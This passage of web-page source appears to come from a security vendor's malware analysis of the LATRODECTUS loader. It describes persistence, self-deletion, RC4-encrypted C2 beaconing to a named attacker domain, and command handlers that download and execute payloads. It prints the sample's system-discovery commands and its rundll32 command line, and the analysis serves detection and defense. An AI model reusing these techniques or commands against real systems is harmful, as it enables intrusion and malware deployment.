ID\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"At this stage, the decrypted campaign name (\",(0,n.jsx)(e.code,{children:\"Littlehw\"}),\") from our sample is used as a seed passed into a Fowler\\u2013Noll\\u2013Vo hashing \",(0,n.jsx)(e.a,{href:\"https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function\",rel:\"nofollow\",children:\"function\"}),\". This will produce a hash that is used by the actor to track different campaigns and associated victim machines.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image37.png\",alt:\"Campaign ID calculation using FNV\",width:\"572\",height:\"97\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"setup--persistence\",children:\"Setup / persistence\"}),`\n`,(0,n.jsx)(e.p,{children:\"The malware will generate a folder path using a configuration parameter, these determine the location where LATRODECTUS will be dropped on disk, such as the following directories:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"AppData\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"Desktop\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"Startup\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"Personal\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"Local\\\\AppData\"})}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Our sample was configured with the \",(0,n.jsx)(e.code,{children:\"AppData\"}),\" location using a hard-coded directory string \",(0,n.jsx)(e.code,{children:\"Custom_update\"}),\" along with a hardcoded filename \",(0,n.jsx)(e.code,{children:\"Update_\"}),\" concatenated with digits seeded from the volume serial number. Below is the full file path inside our VM:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`C:\\\\Users\\\\REM\\\\AppData\\\\Roaming\\\\Custom_update\\\\Update_88d58563.dll\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The malware will check for an existing file \",(0,n.jsx)(e.code,{children:\"AppData\\\\Roaming\\\\Custom_update\\\\update_data.dat\"}),\" to read from, and if the file does not exist it will create the directory before writing a copy of itself in the directory.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image7.png\",alt:\"LATRODECTUS written in AppData\",width:\"1406\",height:\"323\"})}),`\n`,(0,n.jsx)(e.p,{children:\"After the file is copied, LATRODECTUS retrieves two C2 domains from the global configuration, using the previously-described string decryption function.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image19.png\",alt:\"Decrypting C2 servers\",width:\"906\",height:\"476\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Before the main thread is executed for command dispatching, LATRODECTUS sets up a scheduled task for persistence using the Windows Component Object Model (COM).\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image14.png\",alt:\"Scheduled task creation via COM\",width:\"735\",height:\"421\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"In our sample, the task name is hardcoded as \",(0,n.jsx)(e.code,{children:\"Updater\"}),\" and scheduled to execute upon successful logon.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image12.png\",alt:\"Scheduled task properties\",width:\"817\",height:\"268\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"self-deletion\",children:\"Self-deletion\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Self-deletion is one noteworthy technique incorporated by LATRODECTUS. It was \",(0,n.jsx)(e.a,{href:\"https://x.com/jonasLyk/status/1350401461985955840\",rel:\"nofollow\",children:\"discovered\"}),\" by Jonas Lykkegaard and implemented by Lloyd Davies in the delete-self-poc \",(0,n.jsx)(e.a,{href:\"https://github.com/LloydLabs/delete-self-poc\",rel:\"nofollow\",children:\"repo\"}),\". The technique allows LATRODECTUS to delete itself while the process is still running using an alternate data stream.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Elastic Security Labs has seen this technique adopted in malware such as the \",(0,n.jsx)(e.a,{href:\"https://chuongdong.com/reverse%20engineering/2022/01/06/RookRansomware/#anti-detection-alternate-data-streams\",rel:\"nofollow\",children:\"ROOK\"}),\" ransomware family. The likely objective is to hinder incident response processes by interfering with collection and analysis. The compiled malware contains a \",(0,n.jsx)(e.a,{href:\"https://github.com/LloydLabs/delete-self-poc/blob/49fe92218fdcfe8e173aa60a9eb307bae07cb027/main.h#L10\",rel:\"nofollow\",children:\"string\"}),\" (\",(0,n.jsx)(e.code,{children:\":wtfbbq\"}),\") present in the repository.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image2.png\",alt:\"Self-deletion code in LATRODECTUS\",width:\"823\",height:\"354\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This technique is observed at the start of the infection as well as when the malware performs an update using event handler #15. Elastic Security Labs has created a \",(0,n.jsx)(e.a,{href:\"https://github.com/mandiant/capa-rules/blob/master/anti-analysis/anti-forensic/self-deletion/self-delete-using-alternate-data-streams.yml\",rel:\"nofollow\",children:\"CAPA rule\"}),\" to help other organizations identify this behavior generically when analyzing various malware.\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"communication\",children:\"Communication\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"LATRODECTUS encrypts its requests using base64 and RC4 with a hardcoded password of \",(0,n.jsx)(e.code,{children:\"12345\"}),\". The first POST request over HTTPS that includes victim information along with configuration details, registering the infected system.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`POST https://aytobusesre.com/live/ HTTP/1.1\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)\nHost: aytobusesre.com\nContent-Length: 256\nCache-Control: no-cache\n\nM1pNDFh7flKrBaDJqAPvJ98BTFDZdSDWDD8o3bMJbpmu0qdYv0FCZ0u6GtKSN0g//WHAS2npR/HDoLtIKBgkLwyrIh/3EJ+UR/0EKhYUzgm9K4DotfExUiX9FBy/HeV7C4PgPDigm55zCU7O9kSADMtviAodjuRBVW3DJ2Pf5+pGH9SG1VI8bdmZg+6GQFpcFTGjdWVcrORkxBjCGq3Eiv2svt3+ZFIN126PcvN95YJ0ie1Puljfs3wqsW455V7O\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image32.png\",alt:\"Initial registration request\",width:\"865\",height:\"324\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Below is an example of the decrypted contents sent in the first request:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`counter=0\u0026type=1\u0026guid=249507485CA29F24F77B0F43D7BA\u0026os=6\u0026arch=1\u0026username=user\u0026group=510584660\u0026ver=1.1\u0026up=4\u0026direction=aytobusesre.com\u0026mac=00:0c:24:0e:29:85;\u0026computername=DESKTOP-3C4ILHO\u0026domain=-\n`})}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Name\"}),(0,n.jsx)(e.th,{children:\"Description\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"counter\"}),(0,n.jsx)(e.td,{children:\"Number of C2 requests increments by one for each callback\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"type\"}),(0,n.jsx)(e.td,{children:\"Type of request (registration, etc)\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"guid\"}),(0,n.jsx)(e.td,{children:\"Generated hardware ID seeded by volume serial number\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"os\"}),(0,n.jsx)(e.td,{children:\"Windows OS product version\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"arch\"}),(0,n.jsx)(e.td,{children:\"Windows architecture version\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"username\"}),(0,n.jsx)(e.td,{children:\"Username of infected machine\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"group\"}),(0,n.jsx)(e.td,{children:\"Campaign identifier seeded by unique string in binary with FNV\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"version\"}),(0,n.jsx)(e.td,{children:\"LATRODECTUS version\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"up\"}),(0,n.jsx)(e.td,{children:\"Unknown\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"direction\"}),(0,n.jsx)(e.td,{children:\"C2 domain\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"mac\"}),(0,n.jsx)(e.td,{children:\"MAC Address\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"computername\"}),(0,n.jsx)(e.td,{children:\"Hostname of infected machine\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"domain\"}),(0,n.jsx)(e.td,{children:\"Domain belonging to infected machine\"})]})]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Each request is pipe-delimited by an object type, integer value, and corresponding argument. There are 4 object types which route the attacker controlled commands (\",(0,n.jsx)(e.strong,{children:\"CLEARURL\"}),\", \",(0,n.jsx)(e.strong,{children:\"URLS\"}),\", \",(0,n.jsx)(e.strong,{children:\"COMMAND\"}),\", \",(0,n.jsx)(e.strong,{children:\"ERROR\"}),\").\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image39.png\",alt:\"Command dispatching logic\",width:\"646\",height:\"510\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The main event handlers are passed through the \",(0,n.jsx)(e.strong,{children:\"COMMAND\"}),\" object type with the handler ID and their respective argument.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`COMMAND|12|http://www.meow123.com/test \n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.strong,{children:\"CLEARURL\"}),\" object type is used to delete any configured domains. The \",(0,n.jsx)(e.strong,{children:\"URLS\"}),\" object type allows the attacker to swap to a new C2 URL. The last object type, \",(0,n.jsx)(e.strong,{children:\"ERROR\"}),\", is not currently configured.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image11.png\",alt:\"Example of command request via CyberChef\",width:\"916\",height:\"408\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"bot-functionality\",children:\"Bot Functionality\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"LATRODECTUS\\u2019s core functionality is driven through its command handlers. These handlers are used to collect information from the victim machine, provide execution capabilities as well as configure the implant. We have seen two additional handlers (retrieve processes, desktop listing) added since the initial \",(0,n.jsx)(e.a,{href:\"https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39\",rel:\"nofollow\",children:\"publication\"}),\" which may be a sign that the codebase is still active and changing.\"]}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Command ID\"}),(0,n.jsx)(e.th,{children:\"Description\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"2\"}),(0,n.jsx)(e.td,{children:\"Retrieve file listing from desktop directory\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"3\"}),(0,n.jsx)(e.td,{children:\"Retrieve process ancestry\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"4\"}),(0,n.jsx)(e.td,{children:\"Collect system information\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"12\"}),(0,n.jsx)(e.td,{children:\"Download and execute PE\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"13\"}),(0,n.jsx)(e.td,{children:\"Download and execute DLL\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"14\"}),(0,n.jsx)(e.td,{children:\"Download and execute shellcode\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"15\"}),(0,n.jsx)(e.td,{children:\"Perform update, restart\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"17\"}),(0,n.jsx)(e.td,{children:\"Terminate own process and threads\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"18\"}),(0,n.jsx)(e.td,{children:\"Download and execute ICEDID payload\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"19\"}),(0,n.jsx)(e.td,{children:\"Increase Beacon Timeout\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"20\"}),(0,n.jsx)(e.td,{children:\"Resets request counter\"})]})]})]})}),`\n`,(0,n.jsx)(e.h4,{id:\"desktop-listing---command-id-2\",children:\"Desktop listing - command ID (2)\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"This command handler will retrieve a list of the contents of the user\\u2019s desktop, which the developer refers to as \",(0,n.jsx)(e.code,{children:\"desklinks\"}),\". This data will be encrypted and appended to the outbound beacon request. This is used for enumerating and validating victim environments quickly.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image16.png\",alt:\"Desktop listing (Handler #2)\",width:\"701\",height:\"616\"})}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.strong,{children:\"Example request\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`counter=0\u0026type=1\u0026guid=249507485CA29F24F77B0F43D7BA\u0026os=6\u0026arch=1\u0026username=user\u0026group=510584660\u0026ver=1.1\u0026up=4\u0026direction=aytobusesre.com\u0026desklinks=[\"OneDrive.lnk\",\"OneNote.lnk\",\"PowerPoint.lnk\",\"Notepad++.lnk\",\"Excel.lnk\",\"Google Chrome.lnk\",\"Snipping Tool.lnk\",\"Notepad.lnk\",\"Paint.lnk\"]\n`})}),`\n`,(0,n.jsx)(e.h4,{id:\"process-ancestry---command-id-3\",children:\"Process ancestry - command ID (3)\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"This event handler is referenced as \",(0,n.jsx)(e.strong,{children:\"proclist\"}),\" by the developer where it collects the entire running process ancestry from the infected machine via the \",(0,n.jsx)(e.strong,{children:\"CreateToolhelp32Snapshot\"}),\" API.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image25.png\",alt:\"Retrieve process ancestry (Handler #3)\",width:\"702\",height:\"390\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Like security researchers, malware authors are interested in process parent/child relationships for decision-making. The authors of LATRODECTUS even collect information about process grandchildren, likely to validate different compromised environments.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image17.png\",alt:\"Example of process ancestry collected by LATRODECTUS\",width:\"869\",height:\"506\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"collect-system-information---command-id-4\",children:\"Collect system information - command ID (4)\"}),`\n`,(0,n.jsx)(e.p,{children:\"This command handler creates a new thread that runs the following system discovery/enumeration commands, each of which is a potential detection opportunity:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`C:\\\\Windows\\\\System32\\\\cmd.exe /c ipconfig /all\nC:\\\\Windows\\\\System32\\\\cmd.exe /c systeminfo\nC:\\\\Windows\\\\System32\\\\cmd.exe /c nltest /domain_trusts\nC:\\\\Windows\\\\System32\\\\cmd.exe /c nltest /domain_trusts /all_trusts\nC:\\\\Windows\\\\System32\\\\cmd.exe /c net view /all /domain\nC:\\\\Windows\\\\System32\\\\cmd.exe /c net view /all\nC:\\\\Windows\\\\System32\\\\cmd.exe /c net group \"Domain Admins\" /domain\nC:\\\\Windows\\\\System32\\\\wbem\\\\wmic.exe /Node:localhost /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nC:\\\\Windows\\\\System32\\\\cmd.exe /c net config workstation\nC:\\\\Windows\\\\System32\\\\cmd.exe /c wmic.exe /node:localhost /namespace:\\\\\\\\root\\\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed\nC:\\\\Windows\\\\System32\\\\cmd.exe /c whoami /groups\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Each output is placed into URI with corresponding collected data:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`\u0026ipconfig=\n\u0026systeminfo=\n\u0026domain_trusts=\n\u0026domain_trusts_all=\n\u0026net_view_all_domain=\n\u0026net_view_all=\n\u0026net_group=\n\u0026wmic=\n\u0026net_config_ws=\n\u0026net_wmic_av=\n\u0026whoami_group=\n`})}),`\n`,(0,n.jsx)(e.h4,{id:\"download-and-execute-pe---command-id-12\",children:\"Download and execute PE - command ID (12)\"}),`\n`,(0,n.jsx)(e.p,{children:\"This handler downloads a PE file from the C2 server then writes the content to disk with a randomly generated file name, then executes the file.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image19.png\",alt:\"Download and Run PE function (Handler #4)\",width:\"906\",height:\"476\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Below is an example in our environment using this handler:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image34.png\",alt:\"Process tree of download and run PE function\",width:\"733\",height:\"52\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"download-and-execute-dll---command-id-13\",children:\"Download and execute DLL - command ID (13)\"}),`\n`,(0,n.jsx)(e.p,{children:\"This command handler downloads a DLL from C2 server, writes it to disk with a randomly generated file name, and executes the DLL using rundll32.exe.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image10.png\",alt:\"Download and run DLL function (Handler #13)\",width:\"875\",height:\"488\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"download-and-execute-shellcode---command-14\",children:\"Download and execute shellcode - command (14)\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"This command handler downloads shellcode from the C2 server via \",(0,n.jsx)(e.code,{children:\"InternetReadFile\"}),\", allocates and copies the shellcode into memory then directly calls it with a new thread pointing at the shellcode.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image24.png\",alt:\"Shellcode execution (Handler #14)\",width:\"772\",height:\"327\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"update--restart----command-id-15\",children:\"Update / restart  - command ID (15)\"}),`\n`,(0,n.jsx)(e.p,{children:\"This handler appears to perform a binary update to the malware where it\\u2019s downloaded, the existing thread/mutex is notified, and then released. The file is subsequently deleted and a new binary is downloaded/executed before terminating the existing process.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image33.png\",alt:\"Update handler (Handler #15)\",width:\"549\",height:\"172\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"terminate---command-id-17\",children:\"Terminate - command ID (17)\"}),`\n`,(0,n.jsx)(e.p,{children:\"This handler will terminate the existing LATRODECTUS process.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image46.png\",alt:\"Self-termination (Handler #17)\",width:\"174\",height:\"48\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"download-and-execute-hosted-iceid-payload---command-id-18\",children:\"Download and execute hosted ICEID payload - command ID (18)\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"This command handler downloads two ICEDID components from a LATRODECTUS server and executes them using a spawned \",(0,n.jsx)(e.code,{children:\"rundll32.exe\"}),\" process. We haven\\u2019t personally observed this being used in-the-wild, however.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The handler creates a folder containing two files to the \",(0,n.jsx)(e.code,{children:\"AppData\\\\Roaming\\\\\"}),\" directory. These file paths and filenames are seeded by a custom random number generator which we will review in the next section. In our case, this new folder location is:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`C:\\\\Users\\\\REM\\\\AppData\\\\Roaming\\\\-632116337\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"It retrieves a file (\",(0,n.jsx)(e.code,{children:\"test.dll\"}),\") from the C2 server, the standard ICEDID loader, which is written to disk with a randomly -generated file name (\",(0,n.jsx)(e.code,{children:\"-456638727.dll\"}),\").\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image9.png\",alt:\"LATRODECTUS downloading ICEDID loader\",width:\"1003\",height:\"226\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"LATRODECTUS will then perform similar steps by generating a random filename for the ICEDID payload (\",(0,n.jsx)(e.code,{children:\"1431684209.dat\"}),\"). Before performing the download, it will set-up the arguments to properly load ICEDID. If you have run into ICEDID in the past, this part of the command-line should look familiar: it\\u2019s used to call the ICEDID export of the loader, while passing the relative path to the encrypted ICEDID payload file.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`init -zzzz=\"-632116337\\\\1431684209.dat\"\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image20.png\",alt:\"LATRODECTUS downloading ICEDID data\",width:\"1160\",height:\"337\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"LATRODECUS initiates a second download request using a hard-coded URI (\",(0,n.jsx)(e.code,{children:\"/files/bp.dat\"}),\") from the configured C2 server, which is written to a file (\",(0,n.jsx)(e.code,{children:\"1431684209.dat\"}),\"). Analyzing the \",(0,n.jsx)(e.code,{children:\"bp.dat\"}),\" file, researchers identified it as a conventional encrypted ICEDID payload, commonly referenced as \",(0,n.jsx)(e.code,{children:\"license.dat\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image31.png\",alt:\"Encrypted ICEDID payload (bp.dat)\",width:\"645\",height:\"284\"})}),`\n`,(0,n.jsx)(e.p,{children:\"After decrypting the file, malware researchers noted a familiar 129 byte sequence of junk bytes prepended to the file followed by the custom section headers.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image43.png\",alt:\"Decrypted ICEDID payload (bp.dat)\",width:\"694\",height:\"345\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Our team was able to revisit \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/unpacking-icedid\",rel:\"nofollow\",children:\"prior tooling\"}),\" and successfully decrypt this file, enabling us to rebuild the PE (ICEDID).\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image28.png\",alt:\"ICEDID YARA triggering on rebuilt PE from bp.dat\",width:\"1174\",height:\"371\"})}),`\n`,(0,n.jsx)(e.p,{children:\"At this point, the ICEDID loader and encrypted payload have been downloaded to the same folder.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image38.png\",alt:\"\",width:\"852\",height:\"205\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"These files are then executed together using \",(0,n.jsx)(e.code,{children:\"rundll32.exe\"}),\" via \",(0,n.jsx)(e.strong,{children:\"CreateProcessW\"}),\" with their respective arguments. Below is the observed command-line:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`rundll32.exe C:\\\\Users\\\\REM\\\\AppData\\\\Roaming\\\\-632116337\\\\-456638727.dll,init -zzzz=\"-632116337\\\\1431684209.dat\"\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image18.png\",alt:\"Rundll32.exe execution\",width:\"989\",height:\"220\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Scanning the \",(0,n.jsx)(e.code,{children:\"rundll32.exe\"}),\" child process spawned by LATRODECTUS with our ICEDID YARA rule also indicates the presence of the ICEDID.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image41.png\",alt:\"YARA memory scan detecting ICEDID\",width:\"618\",height:\"198\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"beacon-timeout---command-id-19\",children:\"Beacon timeout - command ID (19)\"}),`\n`,(0,n.jsx)(e.p,{children:\"LATRODECTUS supports jitter for beaconing to C2. This can make it harder for defenders to detect via network sources due to randomness this introduces to beaconing intervals.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image45.png\",alt:\"Adjust timeout feature (Handler #19)\",width:\"772\",height:\"247\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"In order to calculate the timeout, it generates a random number by seeding a combination of the user\\u2019s cursor position on the screen multiplied by the system\\u2019s uptime (\",(0,n.jsx)(e.code,{children:\"GetTickCount\"}),\"). This result is passed as a parameter to \",(0,n.jsx)(e.strong,{children:\"RtlRandomEx\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image22.png\",alt:\"Random number generator using cursor position\",width:\"594\",height:\"248\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"reset-counter---command-id-20\",children:\"Reset counter - command ID (20)\"}),`\n`,(0,n.jsx)(e.p,{children:\"This command handler will reset the request counter that is passed on each communication request. For example, on the third callback it is filled with 3 here. With this function, the developer can reset the count starting from 0.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`counter=3\u0026type=4\u0026guid=638507385\n`})}),`\n`,(0,n.jsx)(e.h3,{id:\"latrodectus--icedid-connection\",children:\"LATRODECTUS / ICEDID connection\"}),`\n`,(0,n.jsx)(e.p,{children:\"There definitely is some kind of development connection or working arrangement between ICEDID and LATRODECTUS. Below are some of the similarities observed:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"Same enumeration commands in the system discovery handler\"}),`\n`,(0,n.jsx)(e.li,{children:\"The DLL exports all point to same export function address, this was a common observation with ICEDID payloads\"}),`\n`,(0,n.jsx)(e.li,{children:\"C2 data is concatenated together as variables in the C2 traffic requests\"}),`\n`,(0,n.jsxs)(e.li,{children:[\"The \",(0,n.jsx)(e.code,{children:\"bp.dat\"}),\" file downloaded from handler (#18) is used to execute the ICEDID payload via \",(0,n.jsx)(e.code,{children:\"rundll32.exe\"})]}),`\n`,(0,n.jsx)(e.li,{children:\"The functions appear to be similarly coded\"}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image13.png\",alt:\"COM-based Scheduled Task setup - ICEDID vs LATRODECTUS\",width:\"1440\",height:\"533\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Researchers didn\\u2019t conclude that there was a clear relationship between the ICEDID and LATRODECTUS families, though they appear at least superficially affiliated. ICEDID possesses more mature capabilities, like those used for data theft or the \",(0,n.jsx)(e.a,{href:\"https://www.team-cymru.com/post/inside-the-icedid-backconnect-protocol\",rel:\"nofollow\",children:\"BackConnect\"}),\" module, and has been richly documented over a period of several years. One hypothesis being considered is that LATRODECTUS is being actively developed as a replacement for ICEDID, and the handler (#18) was included until malware authors were satisfied with LATRODECTUS\\u2019 capabilities.\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"sandboxing-latrodectus\",children:\"Sandboxing LATRODECTUS\"}),`\n`,(0,n.jsx)(e.p,{children:\"To evaluate LATRODECTUS detections, we set up a Flask server configured with the different handlers to instruct an infected machine to perform various actions in a sandbox environment. This method provides defenders with a great opportunity to assess the effectiveness of their detection and logging tools against every capability. Different payloads like shellcode/binaries can be exchanged as needed.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image42.png\",alt:\"Command handlers 